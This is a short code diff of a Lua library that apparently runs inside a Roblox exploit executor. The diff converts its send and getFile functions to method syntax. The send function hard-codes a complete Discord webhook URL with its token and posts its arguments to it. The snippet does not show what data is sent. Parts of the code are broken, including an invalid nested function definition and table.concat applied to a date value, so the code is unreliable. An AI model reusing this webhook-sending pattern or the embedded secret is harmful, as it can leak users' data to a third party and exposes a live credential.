@@ -3,7 +3,7 @@ getgenv().KERNEL32_running = true;
 local lib = {["run"] = getgenv().KERNEL32_running}
 lib.__index = lib
 
-function lib.send(...)
+function lib:send(...)
     local arguments = {...};
     local url_webhook = 'https://discord.com/api/webhooks/975609122806435890/xLKOEeEGmF1_a8AjezlyYIynMPjcOQ3f4z33C9MDaea9wpHfvVVQU59IVgdjuwKMhezJ';
 
@@ -24,7 +24,7 @@ function lib.send(...)
     return ("" .. table.concat(DateTime.now().ToLocalTime(), " "));
 end
 
-function lib.getFile(filename, folder)
+function lib:getFile(filename, folder)
     local tmp = {}
     local this = tmp;
     local function tmp.getUrl()
